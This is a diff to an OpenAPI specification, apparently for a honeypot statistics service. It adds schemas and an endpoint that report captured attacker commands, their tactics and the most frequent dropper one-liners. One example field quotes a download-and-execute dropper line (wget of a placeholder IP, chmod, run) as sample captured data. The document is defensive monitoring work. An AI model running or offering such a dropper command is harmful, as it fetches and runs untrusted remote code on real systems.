@@ -259,6 +259,76 @@
         ],
         "type": "object"
       },
+      "CommandStatsResponse": {
+        "additionalProperties": false,
+        "properties": {
+          "active_sessions": {
+            "description": "Distinct sessions that ran at least one command.",
+            "example": 151,
+            "type": "integer"
+          },
+          "tactics": {
+            "description": "Atomic commands grouped by attacker tactic.",
+            "items": {
+              "$ref": "#/components/schemas/CommandTacticResponse"
+            },
+            "type": "array"
+          },
+          "top_commands": {
+            "description": "Top executables by frequency, descending.",
+            "items": {
+              "$ref": "#/components/schemas/TopCommandResponse"
+            },
+            "type": "array"
+          },
+          "top_lines": {
+            "description": "Top compound one-liners (dropper scripts).",
+            "items": {
+              "$ref": "#/components/schemas/TopCommandLineResponse"
+            },
+            "type": "array"
+          },
+          "total_commands": {
+            "description": "All command rows recorded (atomic + compound).",
+            "example": 1840,
+            "type": "integer"
+          },
+          "unique_commands": {
+            "description": "Distinct executable buckets among atomic commands.",
+            "example": 42,
+            "type": "integer"
+          }
+        },
+        "required": [
+          "active_sessions",
+          "tactics",
+          "top_commands",
+          "top_lines",
+          "total_commands",
+          "unique_commands"
+        ],
+        "type": "object"
+      },
+      "CommandTacticResponse": {
+        "additionalProperties": false,
+        "properties": {
+          "count": {
+            "description": "Atomic commands classified into this tactic.",
+            "example": 312,
+            "type": "integer"
+          },
+          "name": {
+            "description": "Attacker tactic: recon | download | execute | persist | destroy | shell | other.",
+            "example": "recon",
+            "type": "string"
+          }
+        },
+        "required": [
+          "count",
+          "name"
+        ],
+        "type": "object"
+      },
       "CountriesResponse": {
         "additionalProperties": false,
         "properties": {
@@ -835,6 +905,46 @@
         ],
         "type": "object"
       },
+      "TopCommandLineResponse": {
+        "additionalProperties": false,
+        "properties": {
+          "count": {
+            "description": "Times this exact one-liner was seen.",
+            "example": 7,
+            "type": "integer"
+          },
+          "input": {
+            "description": "Verbatim compound one-liner (a chained/piped dropper script), IP-redacted.",
+            "example": "cd /tmp; wget http://\u2039ip\u203a/meow; chmod 777 meow; ./meow",
+            "type": "string"
+          }
+        },
+        "required": [
+          "count",
+          "input"
+        ],
+        "type": "object"
+      },
+      "TopCommandResponse": {
+        "additionalProperties": false,
+        "properties": {
+          "command": {
+            "description": "Executable basename bucket -- '/bin/uname', 'uname -a' and 'uname' all collapse here (IPs redacted).",
+            "example": "uname",
+            "type": "string"
+          },
+          "count": {
+            "description": "Atomic commands that ran this executable.",
+            "example": 96,
+            "type": "integer"
+          }
+        },
+        "required": [
+          "command",
+          "count"
+        ],
+        "type": "object"
+      },
       "TopCountryResponse": {
         "additionalProperties": false,
         "properties": {
@@ -1338,6 +1448,51 @@
           }
         },
         "summary": "Return the accept/reject split across all auth attempts.",
+        "tags": [
+          "stats"
+        ]
+      }
+    },
+    "/api/v1/stats/commands": {
+      "get": {
+        "operationId": "statsCommands",
+        "parameters": [
+          {
+            "description": "Number of top entries to return (max 100).",
+            "in": "query",
+            "name": "top_n",
+            "required": false,
+            "schema": {
+              "default": 10,
+              "example": 10,
+              "maximum": 100,
+              "minimum": 1,
+              "type": "integer"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "content": {
+              "application/json": {
+                "schema": {
+                  "$ref": "#/components/schemas/CommandStatsResponse"
+                }
+              }
+            },
+            "description": "OK"
+          },
+          "422": {
+            "$ref": "#/components/responses/UnprocessableEntity"
+          },
+          "500": {
+            "$ref": "#/components/responses/InternalServerError"
+          },
+          "default": {
+            "$ref": "#/components/responses/DEFAULT_ERROR"
+          }
+        },
+        "summary": "Return command analytics (top commands, tactics, dropper scripts).",
         "tags": [
           "stats"
         ]
